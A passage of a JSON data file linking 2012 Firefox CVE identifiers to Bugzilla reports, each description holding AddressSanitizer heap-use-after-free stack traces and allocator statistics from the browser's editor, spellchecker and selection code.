void*) firefox/src/dom/base/nsGlobalWindow.cpp:10055 #28 0x7fc2071f9094 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:473 #29 0x7fc2071f95e6 in nsTimerEvent::Run() firefox/src/xpcom/threads/nsTimerImpl.cpp:559 previously allocated by thread T0 here: #0 0x425b02 in __interceptor_malloc ??:0 #1 0x7fc209fd13f0 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 #2 0x7fc205a3f31d in nsContentUtils::SetNodeTextContent(nsIContent*, nsAString_internal const&, bool) firefox/src/content/base/src/nsContentUtils.cpp:4310 #3 0x7fc20677c151 in nsIDOMNode_SetTextContent(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::Value*) firefox/src/objdir-ff-asan/js/xpconnect/src/dom_quickstubs.cpp:5665 #4 0x7fc207b64928 in js::CallJSPropertyOpSetter(JSContext*, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::Value*), JS::Handle<JSObject*>, JS::Handle<long>, int, JS::Value*) firefox/src/js/src/jscntxtinlines.h:460 #5 0x7fc207b695f1 in js::baseops::SetPropertyHelper(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, unsigned int, JS::Value*, int) firefox/src/js/src/jsobj.cpp:4924 #6 0x7fc207b2d620 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Value const&, JS::Value const&) firefox/src/js/src/jsinterpinlines.h:353 #7 0x7fc207b0bbb8 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2378 #8 0x7fc207b09315 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:299 #9 0x7fc207b29467 in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:482 #10 0x7fc207b297f1 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:519 #11 0x7fc207a3a713 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5370 #12 0x7fc207a3a9d9 in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5407 #13 0x7fc205f23907 in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1466 #14 0x7fc205f7eece in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9519 #15 0x7fc205f6e285 in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9783 #16 0x7fc205f7e378 in nsGlobalWindow::TimerCallback(nsITimer*, void*) firefox/src/dom/base/nsGlobalWindow.cpp:10055 #17 0x7fc2071f9094 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:473 #18 0x7fc2071f95e6 in nsTimerEvent::Run() firefox/src/xpcom/threads/nsTimerImpl.cpp:559 #19 0x7fc2071ef654 in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:624 #20 0x7fc20716061d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:217 #21 0x7fc206f5fd48 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #22 0x7fc20726091f in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #23 0x7fc206d6f73e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #24 0x7fc205171943 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 ==19766== ABORTING Stats: 254M malloced (344M for red zones) by 1006225 calls Stats: 61M realloced by 90383 calls Stats: 199M freed by 740263 calls Stats: 96M really freed by 201732 calls Stats: 528M (135231 full pages) mmaped in 132 calls mmaps by size class: 8:704469; 9:81910; 10:24570; 11:20470; 12:5120; 13:4608; 14:1792; 15:512; 16:640; 17:160; 18:208; 19:48; 20:16; mallocs by size class: 8:829738; 9:109453; 10:28229; 11:24936; 12:5172; 13:4924; 14:2120; 15:516; 16:683; 17:171; 18:222; 19:45; 20:16; frees by size class: 8:588569; 9:95710; 10:23943; 11:20926; 12:3996; 13:3894; 14:1904; 15:444; 16:595; 17:151; 18:78; 19:40; 20:13; rfrees by size class: 8:144710; 9:31877; 10:10454; 11:10832; 12:1184; 13:698; 14:1154; 15:224; 16:419; 17:82; 18:51; 19:37; 20:10; Stats: malloc large: 454 small slow: 3904 Shadow byte and word: 0x1ff839bad137: fd 0x1ff839bad130: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff839bad110: 00 00 00 fb fb fb fb fb 0x1ff839bad118: fb fb fb fb fb fb fb fb 0x1ff839bad120: fa fa fa fa fa fa fa fa 0x1ff839bad128: fa fa fa fa fa fa fa fa =>0x1ff839bad130: fd fd fd fd fd fd fd fd 0x1ff839bad138: fd fd fd fd fd fd fd fd 0x1ff839bad140: fa fa fa fa fa fa fa fa 0x1ff839bad148: fa fa fa fa fa fa fa fa 0x1ff839bad150: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-3959": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=771994",
        "title": "Heap-use-after-free in nsRangeUpdater::SelAdjDeleteNode",
        "description": "Reproduces on trunk, testcase coming soon. Below is a fully symbolized stack. 20120707214206 http://hg.mozilla.org/mozilla-central/rev/9533b40ff28b ================================================================= ==21914== ERROR: AddressSanitizer heap-use-after-free on address 0x7f4120fac130 at pc 0x7f414d5a0c33 bp 0x7fff10d82d30 sp 0x7fff10d82d28 READ of size 8 at 0x7f4120fac130 thread T0 #0 0x7f414d5a0c33 in nsCOMPtr<nsIDOMNode>::get() const firefox/src/modules/zlib/src/inffast.c:0 #1 0x7f41521a148e in nsRangeUpdater::SelAdjDeleteNode(nsIDOMNode*) firefox/src/editor/libeditor/base/nsSelectionState.cpp:271 #2 0x7f41521d8818 in DeleteNodeTxn::DoTransaction() firefox/src/editor/libeditor/base/DeleteNodeTxn.cpp:74 #3 0x7f41555503b9 in nsTransactionItem::DoTransaction() firefox/src/editor/txmgr/src/nsTransactionItem.cpp:178 #4 0x7f4155574d8e in nsTransactionManager::BeginTransaction(nsITransaction*) firefox/src/editor/txmgr/src/nsTransactionManager.cpp:729 #5 0x7f4155562d25 in nsTransactionManager::DoTransaction(nsITransaction*) firefox/src/editor/txmgr/src/nsTransactionManager.cpp:74 #6 0x7f41520afcf3 in nsEditor::DoTransaction(nsITransaction*) firefox/src/editor/libeditor/base/nsEditor.cpp:689 #7 0x7f41520cc7bd in nsEditor::DeleteNode(nsINode*) firefox/src/editor/libeditor/base/nsEditor.cpp:1492 #8 0x7f41520cbe8b in nsEditor::DeleteNode(nsIDOMNode*) firefox/src/editor/libeditor/base/nsEditor.cpp:1476 #9 0x7f41526457ee in nsHTMLEditor::DeleteNode(nsIDOMNode*) firefox/src/editor/libeditor/html/nsHTMLEditor.cpp:3226 #10 0x7f4152082664 in nsTextEditRules::WillInsert(nsISelection*, bool*) firefox/src/editor/libeditor/text/nsTextEditRules.cpp:324 #11 0x7f415274d1fc in nsHTMLEditRules::WillInsert(nsISelection*, bool*) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:1171 #12 0x7f41526ff9bc in nsHTMLEditRules::WillInsertText(nsEditor::OperationID, mozilla::Selection*, bool*, bool*, nsAString_internal const*, nsAString_internal*, int) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:1264 #13 0x7f41526fbd14 in nsHTMLEditRules::WillDoAction(mozilla::Selection*, nsRulesInfo*, bool*, bool*) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:570 #14 0x7f4152049777 in nsPlaintextEditor::InsertText(nsAString_internal const&) firefox/src/editor/libeditor/text/nsPlaintextEditor.cpp:700 #15 0x7f415204a2ef in non-virtual thunk to nsPlaintextEditor::InsertText(nsAString_internal const&) firefox/src/modules/zlib/src/inffast.c:0 #16 0x7f415216b714 in nsInsertPlaintextCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) firefox/src/editor/libeditor/base/nsEditorCommands.cpp:834 #17 0x7f41553ebcbc in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) firefox/src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 #18 0x7f41553be57f in nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) firefox/src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:153 #19 0x7f41553be8b7 in non-virtual thunk to nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) firefox/src/modules/zlib/src/inffast.c:0 #20 0x7f41553d6061 in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) firefox/src/embedding/components/commandhandler/src/nsCommandManager.cpp:236 #21 0x7f4150a232f4 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) firefox/src/content/html/document/src/nsHTMLDocument.cpp:3218 #22 0x7f4150a253ee in non-virtual thunk to nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) firefox/src/modules/zlib/src/inffast.c:0 #23 0x7f415880dbfa in NS_InvokeByIndex_P firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 #24 0x7f4153f8a56b in CallMethodHelper::Call() firefox/src/js/xpconnect/src/XPCWrappedNative.cpp:2405 #25 0x7f4153ff17d4 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) firefox/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1474 #26 0x7f415db3664d in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:400 #27 0x7f415d4c9040 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) firefox/src/js/src/jsinterp.h:119 #28 0x7f415db3bc0d in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) firefox/src/js/src/jsinterp.cpp:382 #29 0x7f415df7bef9 in js::IndirectProxyHandler::call(JSContext*, JSObject*, unsigned int, JS::Value*) firefox/src/js/src/jsproxy.cpp:441 #30 0x7f415e71c5e1 in js::DirectWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) firefox/src/js/src/jswrapper.cpp:303 #31 0x7f415e731179 in js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) firefox/src/js/src/jswrapper.cpp:699 #32 0x7f415e731985 in non-virtual thunk to js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) ??:0 #33 0x7f415dfb13a1 in js::Proxy::call(JSContext*, JSObject*, unsigned int, JS::Value*) firefox/src/js/src/jsproxy.cpp:1134 #34 0x7f415dfc9b2c in proxy_Call(JSContext*, unsigned int, JS::Value*) firefox/src/js/src/jsproxy.cpp:1657 #35 0x7f415db361f5 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:400 #36 0x7f415daa9268 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2465 #37 0x7f415da2d777 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:299 #38 0x7f415db434bd in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:482 #39 0x7f415db451c0 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:519 #40 0x7f415d36b011 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5370 #41 0x7f415d36cf4c in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5407 #42 0x7f41511cf74f in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1466 #43 0x7f415137eb5e in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9519 #44 0x7f4151333ee2 in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9783 #45 0x7f415137cd6b in nsGlobalWindow::TimerCallback(nsITimer*, void*) firefox/src/dom/base/nsGlobalWindow.cpp:10055 #46 0x7f4158748a42 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:474 #47 0x7f415874a67c in nsTimerEvent::Run() firefox/src/xpcom/threads/nsTimerImpl.cpp:558 #48 0x7f415870cccd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #49 0x7f415839c01d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #50 0x7f415743d226 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #51 0x7f41589c084a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #52 0x7f41589c0693 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #53 0x7f41589c0578 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #54 0x7f415697542e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #55 0x7f41555c0668 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #56 0x7f414bdfd280 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 #57 0x7f414be03c22 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 #58 0x7f414be070f2 in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3940 #59 0x40c28f in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #60 0x409cbd in main firefox/src/browser/app/nsBrowserApp.cpp:330 #61 0x7f4166a4fc4d in ?? ??:0 0x7f4120fac130 is located 176 bytes inside of 1120-byte region [0x7f4120fac080,0x7f4120fac4e0) freed by thread T0 here: #0 0x4a4392 in free ??:0 #1 0x7f41638dd5c3 in moz_free firefox/src/memory/mozalloc/mozalloc.cpp:49 #2 0x7f41526d8516 in ~nsHTMLEditRules firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:198 #3 0x7f415206b677 in nsTextEditRules::Release() firefox/src/editor/libeditor/text/nsTextEditRules.cpp:90 #4 0x7f41526d8c34 in nsHTMLEditRules::Release() firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:205 #5 0x7f414bdc7250 in ~nsCOMPtr_base firefox/src/../../dist/include/nsCOMPtr.h:408 #6 0x7f4152067456 in nsCOMPtr<nsIEditRules>::~nsCOMPtr() firefox/src/../../../dist/include/nsCOMPtr.h:447 #7 0x7f41520341a3 in nsCOMPtr<nsIEditRules>::~nsCOMPtr() firefox/src/../../../dist/include/nsCOMPtr.h:447 #8 0x7f4152047fee in nsPlaintextEditor::DeleteSelection(short, short) firefox/src/editor/libeditor/text/nsPlaintextEditor.cpp:670 #9 0x7f41521622b8 in nsDeleteCommand::DoCommand(char const*, nsISupports*) firefox/src/editor/libeditor/base/nsEditorCommands.cpp:585 #10 0x7f41553eb40d in nsControllerCommandTable::DoCommand(char const*, nsISupports*) firefox/src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:158 #11 0x7f41553bdd14 in nsBaseCommandController::DoCommand(char const*) firefox/src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:137 #12 0x7f41553d6151 in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) firefox/src/embedding/components/commandhandler/src/nsCommandManager.cpp:238 #13 0x7f4150a22a7a in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) firefox/src/content/html/document/src/nsHTMLDocument.cpp:3200 #14 0x7f4150a253ee in non-virtual thunk to nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) firefox/src/modules/zlib/src/inffast.c:0 #15 0x7f415880dbfa in NS_InvokeByIndex_P firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 #16 0x7f4153f8a56b in CallMethodHelper::Call() firefox/src/js/xpconnect/src/XPCWrappedNative.cpp:2405 #17 0x7f4153ff17d4 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) firefox/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1474 #18 0x7f415db3664d in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:400 #19 0x7f415daa9268 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2465 #20 0x7f415da2d777 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:299 #21 0x7f415db434bd in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:482 #22 0x7f415db451c0 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:519 #23 0x7f415d36b011 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5370 #24 0x7f415d36cf4c in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5407 #25 0x7f41511cf74f in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1466 #26 0x7f415137eb5e in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9519 #27 0x7f4151333ee2 in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9783 #28 0x7f415137cd6b in nsGlobalWindow::TimerCallback(nsITimer*, void*) firefox/src/dom/base/nsGlobalWindow.cpp:10055 #29 0x7f4158748a42 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:474 previously allocated by thread T0 here: #0 0x4a4452 in __interceptor_malloc ??:0 #1 0x7f41638dd717 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f41525eab1b in nsHTMLEditor::InitRules() firefox/src/editor/libeditor/html/nsHTMLEditor.cpp:486 #3 0x7f4152037a60 in nsPlaintextEditor::EndEditorInit() firefox/src/editor/libeditor/text/nsPlaintextEditor.cpp:186 #4 0x7f41520689ce in ~nsAutoEditInitRulesTrigger firefox/src/editor/libeditor/text/nsTextEditUtils.cpp:85 #5 0x7f41525e58b4 in nsHTMLEditor::Init(nsIDOMDocument*, nsIContent*, nsISelectionController*, unsigned int) firefox/src/editor/libeditor/html/nsHTMLEditor.cpp:287 #6 0x7f4155babb31 in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) firefox/src/editor/composer/src/nsEditingSession.cpp:459 #7 0x7f4155ba124e in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, char const*, bool, bool, bool) firefox/src/editor/composer/src/nsEditingSession.cpp:169 #8 0x7f41509f2448 in nsHTMLDocument::EditingStateChanged() firefox/src/content/html/document/src/nsHTMLDocument.cpp:2679 #9 0x7f4150a16e77 in nsHTMLDocument::MaybeEditingStateChanged() firefox/src/content/html/document/src/nsHTMLDocument.cpp:2326 #10 0x7f4150a17648 in nsHTMLDocument::EndUpdate(unsigned int) firefox/src/content/html/document/src/nsHTMLDocument.cpp:2339 #11 0x7f41524491b1 in nsHtml5TreeOpExecutor::EndDocUpdate() firefox/src/parser/html/nsHtml5TreeOpExecutor.h:265 #12 0x7f41524487b7 in nsHtml5TreeOpExecutor::DidBuildModel(bool) firefox/src/parser/html/nsHtml5TreeOpExecutor.cpp:134 #13 0x7f4152431d6f in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) firefox/src/parser/html/nsHtml5TreeOperation.cpp:621 #14 0x7f415244ca06 in nsHtml5TreeOpExecutor::RunFlushLoop() firefox/src/parser/html/nsHtml5TreeOpExecutor.cpp:566 #15 0x7f41524889c6 in nsHtml5ExecutorFlusher::Run() firefox/src/parser/html/nsHtml5StreamParser.cpp:127 #16 0x7f415870cccd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #17 0x7f415839c01d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #18 0x7f415743d226 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #19 0x7f41589c084a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #20 0x7f41589c0693 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #21 0x7f41589c0578 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #22 0x7f415697542e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #23 0x7f41555c0668 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #24 0x7f414bdfd280 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 ==21914== ABORTING Stats: 233M malloced (294M for red zones) by 765806 calls Stats: 59M realloced by 49108 calls Stats: 192M freed by 507438 calls Stats: 71M really freed by 191258 calls Stats: 464M (118844 full pages) mmaped in 116 calls mmaps by size class: 8:491490; 9:57337; 10:36855; 11:20470; 12:4096; 13:3584; 14:1792; 15:384; 16:640; 17:192; 18:208; 19:48; 20:16; mallocs by size class: 8:613146; 9:72863; 10:44103; 11:23815; 12:4500; 13:3975; 14:1770; 15:446; 16:685; 17:216; 18:228; 19:46; 20:13; frees by size class: 8:377324; 9:59823; 10:40191; 11:20179; 12:3343; 13:3663; 14:1532; 15:386; 16:573; 17:196; 18:176; 19:42; 20:10; rfrees by size class: 8:139644; 9:27360; 10:10215; 11:10492; 12:1071; 13:679; 14:1121; 15:194; 16:366; 17:75; 18:35; 19:5; 20:1; Stats: malloc large: 503 small slow: 3318 Shadow byte and word: 0x1fe8241f5826: fd 0x1fe8241f5820: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe8241f5800: fa fa fa fa fa fa fa fa 0x1fe8241f5808: fa fa fa fa fa fa fa fa 0x1fe8241f5810: fd fd fd fd fd fd fd fd 0x1fe8241f5818: fd fd fd fd fd fd fd fd =>0x1fe8241f5820: fd fd fd fd fd fd fd fd 0x1fe8241f5828: fd fd fd fd fd fd fd fd 0x1fe8241f5830: fd fd fd fd fd fd fd fd 0x1fe8241f5838: fd fd fd fd fd fd fd fd 0x1fe8241f5840: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-3960": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=771976",
        "title": "Heap-use-after-free in mozSpellChecker::SetCurrentDictionary",
        "description": "Reproduced on trunk. It wasn't a reliable crash, will update bug if i get a reliable testcase. Looks like |this|(mozSpellChecker) is blown from underneath[see free stack] and then causes a crash on reading its member variable here 357 mSpellCheckingEngine->SetPersonalDictionary(personalDictionary.get()); 20120707214206 http://hg.mozilla.org/mozilla-central/rev/9533b40ff28b ================================================================= ==7193== ERROR: AddressSanitizer heap-use-after-free on address 0x7fd80c73caa8 at pc 0x7fd83187223d bp 0x7fff83f39930 sp 0x7fff83f39928 READ of size 8 at 0x7fd80c73caa8 thread T0 #0 0x7fd83187223d in mozSpellChecker::SetCurrentDictionary(nsAString_internal const&) extensions/spellcheck/src/mozSpellChecker.cpp:357 #1 0x7fd83133d55d in nsEditorSpellCheck::SetCurrentDictionary(nsAString_internal const&) editor/composer/src/nsEditorSpellCheck.cpp:523 #2 0x7fd83133ede7 in nsEditorSpellCheck::UpdateCurrentDictionary() editor/composer/src/nsEditorSpellCheck.cpp:651 #3 0x7fd83188b2d6 in mozInlineSpellChecker::UpdateCurrentDictionary() extensions/spellcheck/src/mozInlineSpellChecker.cpp:1783 #4 0x7fd830558864 in nsEditorEventListener::Focus(nsIDOMEvent*) editor/libeditor/base/nsEditorEventListener.cpp:888 #5 0x7fd83055392f in nsEditorEventListener::HandleEvent(nsIDOMEvent*) editor/libeditor/base/nsEditorEventListener.cpp:311 #6 0x7fd82fd3939e in nsRefPtr<nsIDOMEventListener>::operator nsIDOMEventListener*() const content/events/src/nsEventListenerManager.cpp:818 #7 0x7fd82fd9979d in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) content/events/src/nsEventListenerManager.h:143 0x7fd80c73caa8 is located 40 bytes inside of 56-byte region [0x7fd80c73ca80,0x7fd80c73cab8) freed by thread T0 here: #0 0x424442 in free #1 0x7fd83186bc99 in mozSpellChecker::Release() extensions/spellcheck/src/mozSpellChecker.cpp:16 #2 0x7fd83052a870 in nsCOMPtr<nsIInlineSpellChecker>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:442 #3 0x7fd83052a68d in non-virtual thunk to nsEditor::Observe(nsISupports*, char const*, unsigned short const*) ../../../dist/include/nsCOMPtr.h:757 #4 0x7fd831ca14e5 in nsTHashtable<nsObserverList>::GetEntry(char const*) const ../../dist/include/nsTHashtable.h:147 previously allocated by thread T0 here: #0 0x424502 in __interceptor_malloc #1 0x7fd8349d61a9 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 ==7193== ABORTING Stats: 186M malloced (225M for red zones) by 546881 calls Stats: 36M realloced by 21270 calls Stats: 147M freed by 250321 calls Stats: 13M really freed by 49274 calls Stats: 420M (107580 full pages) mmaped in 105 calls mmaps by size class: 8:425958; 9:57337; 10:20475; 11:14329; 12:5120; 13:3072; 14:1792; 15:512; 16:704; 17:128; 18:224; 19:40; 20:16; mallocs by size class: 8:448516; 9:54348; 10:19102; 11:14230; 12:4418; 13:2919; 14:1824; 15:407; 16:723; 17:119; 18:221; 19:41; 20:13; frees by size class: 8:177903; 9:37821; 10:14745; 11:11000; 12:3384; 13:2594; 14:1557; 15:344; 16:652; 17:98; 18:173; 19:39; 20:11; rfrees by size class: 8:42301; 9:3888; 10:1120; 11:1186; 12:273; 13:185; 14:128; 15:52; 16:129; 17:7; 18:4; 19:1; Stats: malloc large: 394 small slow: 2548 Shadow byte and word: 0x1ffb018e7955: fd 0x1ffb018e7950: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffb018e7930: fd fd fd fd fd fd fd fd 0x1ffb018e7938: fd fd fd fd fd fd fd fd 0x1ffb018e7940: fa fa fa fa fa fa fa fa 0x1ffb018e7948: fa fa fa fa fa fa fa fa =>0x1ffb018e7950: fd fd fd fd fd fd fd fd 0x1ffb018e7958: fd fd fd fd fd fd fd fd 0x1ffb018e7960: fa fa fa fa fa fa fa fa 0x1ffb018e7968: fa fa fa fa fa fa fa fa 0x1ffb018e7970: 00 00 00 00 00 00 00 00"
      }
    ],
    "CVE-2012-3961": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=771873",
        "title": "Heap-use-after-free in RangeData::~RangeData",
        "description": "Reproduces on trunk 20120707214206 http://hg.mozilla.org/mozilla-central/rev/9533b40ff28b ================================================================= ==25564== ERROR: AddressSanitizer heap-use-after-free on address 0x7f1cf1264780 at pc 0x7f1d2220e700 bp 0x7fffcdd81470 sp 0x7fffcdd81468 READ of size 8 at 0x7f1cf1264780 thread T0 #0 0x7f1d2220e700 in ~nsRefPtr firefox/src/../../dist/include/nsAutoPtr.h:874 #1 0x7f1d221a42b3 in ~nsRefPtr firefox/src/../../dist/include/nsAutoPtr.h:875 #2 0x7f1d2288b4d3 in RangeData::~RangeData() firefox/src/../../dist/include/mozilla/Selection.h:24 #3 0x7f1d227ea3b3 in RangeData::~RangeData() firefox/src/../../dist/include/mozilla/Selection.h:24 #4 0x7f1d228838e3 in nsTArrayElementTraits<RangeData>::Destruct(RangeData*) firefox/src/../../dist/include/nsTArray.h:349 #5 0x7f1d228823be in nsTArray<RangeData, nsTArrayDefaultAllocator>::DestructRange(unsigned int, unsigned int) firefox/src/../../dist/include/nsTArray.h:1210 #6 0x7f1d22852ab7 in nsTArray<RangeData, nsTArrayDefaultAllocator>::RemoveElementsAt(unsigned int, unsigned int) 